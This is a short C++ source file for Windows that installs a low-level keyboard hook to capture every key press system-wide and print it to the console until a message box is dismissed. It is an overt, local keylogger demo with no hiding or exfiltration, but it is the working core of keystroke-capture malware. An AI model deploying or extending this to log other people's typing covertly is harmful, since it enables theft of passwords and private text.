#include <iostream>
#include <Windows.h>

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
	if (wParam == WM_KEYDOWN) 
	{
		std::cout << char(tolower(p->vkCode));
	}
	return CallNextHookEx(NULL,nCode, wParam, lParam);
}

int main()
{
	SetWindowsHookEx(
	WH_KEYBOARD_LL,
	keyboardHookProc,
	NULL,
	0
	);
	MessageBox(NULL, TEXT("PRESS OK to stop logging."), TEXT("Information"), MB_OK);
	/*while (true)
	{

	}
	*/
	return 0;
}
